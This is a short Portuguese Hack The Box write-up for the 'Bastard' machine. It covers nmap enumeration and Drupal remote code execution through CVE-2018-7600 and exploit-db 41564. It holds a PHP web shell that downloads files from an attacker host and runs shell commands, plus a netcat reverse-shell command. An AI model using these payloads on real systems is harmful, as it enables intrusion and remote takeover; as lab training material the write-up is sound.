# HTB - WRITE UP - BASTARD
## POC: 

# Enumeração 
## NMAP Geral
```
nmap -Pn -sV [IP]
```

## NMAP específico para cada serviço 

## HTTP
```
nmap -Pn -A -p 80 [IP]
```

## CVE-2018-7600
https://www.drupal.org/sa-core-2018-002

## Exploit
https://www.drupal.org/sa-core-2018-002

## Erro no Ruby
https://github.com/dreadlocked/Drupalgeddon2/issues/55
```
sudo gem install highline 
```

## Execução do exploit 
```  
ruby drupalgeddon2.rb http://10.129.14.0/
```  

## RCE Drupal Exploit 
https://www.exploit-db.com/exploits/41564

## Erro php-curl
```
apt update

apt install php-common

apt install php8.1-curl 

apt update 
```

## Execução do exploit<p> 
[+] Altera do hostname vmweb.lan para o ip do alvo<p>
[+] ALtera o hostname no parametro $endpoint_path para /rest se não encontrar o /rest_endpoint na aplicação<p>
[+] Altera no nome do arquivo para o nome do arquivo da shell-reversa<p>
[+] Executa o exploit<p> 
```
php 41564.php
```
## Código para upload e execução da shell-reversa
https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/
```
$phpCode = <<<'EOD'

<?php

    if (isset($_REQUEST['fupload'])) {

        file_put_contents($_REQUEST['fupload'], file_get_contents("http://[IP-ATACANTE]:8888/" . $_REQUEST['fupload']));

    };

    if (isset($_REQUEST['fexec'])) {

        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";

    };

?>

EOD;

$file = [

'filename' => 'vry4n.php',

'data' => $phpCode

];
```
### Download arquivo nc64.exe
https://github.com/int0x33/nc.exe/

### Execução do comando obter a shell-reversa
```
http://10.129.14.0//php-rshell.php?fupload=nc64.exe&fexec=nc64.exe -e cmd 10.10.14.62 1234
```



    
    
